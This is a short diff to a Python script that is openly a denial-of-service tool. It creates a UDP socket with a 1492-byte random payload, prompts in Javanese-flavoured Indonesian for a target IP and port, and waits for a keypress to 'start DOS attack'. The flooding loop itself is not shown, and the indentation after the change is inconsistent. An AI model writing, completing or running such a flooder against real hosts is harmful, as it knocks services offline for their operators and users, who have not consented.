@@ -6,6 +6,10 @@ import time
 import random
 import fade
 
+########################
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1492)
+#################
 
 os.system("clear")
 print(logo)
@@ -26,11 +30,8 @@ _____       ___         _____          _________    _________
 ═════════════════════════════════════════════════════════
 """
 def main():
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1492)
-
-ip = input("Monggo kangmas/mbakyu masukan IP targetnya: ")
-port = int(input("Ojo lali port juga Yo..!!: "))
+       ip = input("Monggo kangmas/mbakyu masukan IP targetnya: ")
+       port = int(input("Ojo lali port juga Yo..!!: "))
 # delay = int(input('Enter interval 1~1000'))
 input('Press any key to start DOS attack on %s:%s'% (ip,port))
 
